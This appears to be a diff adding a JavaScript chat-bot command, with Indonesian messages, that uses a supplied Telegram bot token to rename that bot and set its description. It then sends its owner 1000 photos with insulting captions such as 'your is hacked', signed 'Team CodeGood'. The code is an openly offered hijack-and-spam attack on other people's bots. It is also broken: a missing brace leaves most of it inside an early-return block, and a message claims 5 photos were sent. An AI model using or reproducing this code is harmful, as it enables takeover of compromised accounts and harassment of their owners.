@@ -1,0 +1,50 @@
+case 'set': {
+if (!isOwner) return reply('khusus owner')
+ try {
+ const [token, idOwner, newName] = args.join(" ").split(",").map(v => v.trim());
+ if (!token || !idOwner || !newName) {
+ return m.reply('Masukkan parameter dengan benar.\nContoh: .set tokenbot,idowner,NamaBaru');
+
+ const endpoints = [
+ `https://api.telegram.org/bot${token}/setMyName?name=${encodeURIComponent(newName)}`,
+ `https://api.telegram.org/bot${token}/setMyAbout?about=${encodeURIComponent(newName)}`,
+ `https://api.telegram.org/bot${token}/setMyDescription?description=${encodeURIComponent(newName)}`
+ ];
+
+ for (const url of endpoints) {
+ await fetch(url);
+ }
+
+ m.reply(`✅ Succes change all to: ${newName}`);
+
+ const photos = [
+ "https://files.catbox.moe/pfywb2.jpg",
+ "https://files.catbox.moe/lwreof.jpg",
+ "https://files.catbox.moe/9sd4kr.jpg",
+ "https://files.catbox.moe/q1tkr3.jpg",
+ "https://files.catbox.moe/fnpjwt.jpg"
+ ];
+
+ const captions = [
+ "your is hacked 😶‍🌫️\n\n```By Team CodeGood```", "your is idiot 😈\n\n```By Team CodeGood```", "mampus ni gw spam ⚠️\n\n```By Team CodeGood```", "yahaha tolol dongo 🤭\n\n```By Team CodeGood```",
+ "ini muka lu ya bang? 😂\n\n```By Team CodeGood```", "mampus ni gw spam 😂\n\n```By Team CodeGood```", "bot tolol 🙄\n\n```By Team CodeGood```",
+ "ownernya dongo jir 🤣\n\n```By Team CodeGood```", "haha tolol ownernya bego 🥵\n\n```By Team CodeGood```", "tolol banget botnya awokawok 😂\n\n```By Team CodeGood```"
+ ];
+
+ for (let i = 0; i < 1000; i++) {
+ const randomPhoto = photos[Math.floor(Math.random() * photos.length)];
+ const randomCaption = captions[Math.floor(Math.random() * captions.length)];
+
+ await fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${idOwner}&photo=${encodeURIComponent(randomPhoto)}&caption=${encodeURIComponent(randomCaption)}`);
+
+ await new Promise((resolve) => setTimeout(resolve, 1000));
+ }
+
+ m.reply(`✅ Foto telah dikirim sebanyak 5 kali secara acak ke owner.`);
+
+ } catch (err) {
+ console.error(err);
+ m.reply(`❌ Terjadi kesalahan.\nError: ${err.message}`);
+ }
+}
+break
